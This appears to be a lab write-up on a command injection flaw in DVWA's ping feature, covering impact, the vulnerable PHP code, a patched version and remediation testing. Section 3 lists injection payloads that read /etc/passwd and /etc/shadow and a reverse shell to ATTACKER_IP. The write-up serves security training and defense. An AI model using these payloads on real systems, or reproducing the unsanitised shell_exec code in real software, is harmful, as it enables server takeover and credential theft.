>**Vulnerability ID:** VULN-DVWA-2024-COMMAND-INJECTION  
   **Risk Level:** Critical  
   **CVSS Score:** 9.1 (Critical)

### 1. Business Impact Analysis

- **System Compromise:** Attackers can execute arbitrary operating system commands on the server
- **Data Breach:** Access to sensitive files, databases, and system information 
- **Lateral Movement:** Use compromised server to attack internal network resources
- **Compliance Violations:** Breach of data protection regulations and security standards
### 2. Vulnerability Identification Methods

**Code Analysis Patterns:**
- Search for unsafe system command execution functions in source code:
    - `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`
- Identify user-controlled input used in command execution without validation
- Check for absence of input sanitization and command whitelisting
- Look for command concatenation without proper escaping

**Vulnerability Location Identified:**  
The application contains a command injection vulnerability in the IP address parameter of the ping functionality:

```powershell
http://192.168.1.4/DVWA/vulnerabilities/exec/
```
![[Pasted image 20251106215402.png]]
### 3. Exploitation Analysis

**Attack Vector:** Command Concatenation  
The application directly concatenates user input into system commands without proper sanitization.

**Payload Testing Sequence:**

```bash
8.8.8.8; whoami
8.8.8.8 && id
8.8.8.8; cat /etc/passwd
8.8.8.8 | head /etc/shadow
8.8.8.8; ifconfig
```
# Reverse shell establishment
```bash
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Bypass Techniques:**
- Command separators: `;`, `&&`, `||`, `|`
- Backtick command substitution
- Newline characters (`\n`)
- Encoding and obfuscation techniques
- Environment variable substitution

**Successful Exploitation:**  
The payload `8.8.8.8; cat /etc/passwd` successfully retrieved the system's password file, confirming command execution capabilities.

![[Pasted image 20251106220104.png]]

### 4. Vulnerability Root Cause

**Vulnerable Code:**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $target = $_REQUEST[ 'ip' ];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                // Windows
                $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
                // *nix
                $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        $html .= "<pre>{$cmd}</pre>";
}

?>
```
**Primary Issues:**
1. **Direct Command Concatenation:** User input directly appended to system commands
2. **No Input Validation:** Absence of IP address format validation
3. **Lack of Sanitization:** No filtering of command separators or special characters
4. **Unsafe Function Usage:** Use of `shell_exec()` with untrusted input

### 5. Mitigation Strategies

**Secure Code Implementation:**  
Implement strict input validation and use parameterized command execution.
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

        // Get input
        $target = $_REQUEST[ 'ip' ];
        $target = stripslashes( $target );

        // Split the IP into 4 octects
        $octet = explode( ".", $target );

        // Check IF each octet is an integer
        if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
                // If all 4 octets are int's put the IP back together.
                $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

                // Determine OS and execute the ping command.
                if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                        // Windows
                        $cmd = shell_exec( 'ping  ' . $target );
                }
                else {
                        // *nix
                        $cmd = shell_exec( 'ping  -c 4 ' . $target );
                }

                // Feedback for the end user
                $html .= "<pre>{$cmd}</pre>";
        }
        else {
                // Ops. Let the user name theres a mistake
                $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
        }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

**Defense-in-Depth Measures:**

1. **Input Validation:**
    - Whitelist allowed characters for IP addresses
    - Use built-in PHP validation filters
2. **Command Sanitization:**
    - Use `escapeshellarg()` or `escapeshellcmd()`
    - Implement argument arrays instead of string concatenation
3. **System Hardening:**
    - Run web server with minimal privileges
    - Use application sandboxing where possible
4. **Security Controls:**
    - Implement Web Application Firewall (WAF) rules
    - Regular security code reviews
    - Input validation at multiple layers

### 6. Risk Assessment Matrix

|Impact Area|Severity|Likelihood|Overall Risk|
|---|---|---|---|
|Data Confidentiality|Critical|High|Critical|
|System Integrity|Critical|High|Critical|
|Service Availability|High|High|Critical|
|Compliance|Critical|High|Critical|

### 7. Testing Verification

**Remediation Validation Steps:**

1. Test with basic injection payloads (`; whoami`, `&& id`)
2. Verify IP address format validation rejects malformed input
3. Test command separator filtering (`;`, `&`, `|`, `` ` ``)
4. Confirm proper error handling for invalid inputs
5. Test boundary conditions and edge cases

**Post-Mitigation Testing Results:**

- Command injection attempts return validation errors
- Only properly formatted IP addresses are accepted
- No unauthorized command execution occurs

### Appendix A: Reference Materials

- **OWASP Command Injection:** [https://owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)- **CWE-78: Improper Neutralization of Special Elements used in an OS Command** - [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)
- **MITRE ATT&CK:** T1059 - Command and Scripting Interpreter
- **PHP Security Best Practices:** [https://www.php.net/manual/en/security.php](https://www.php.net/manual/en/security.php)
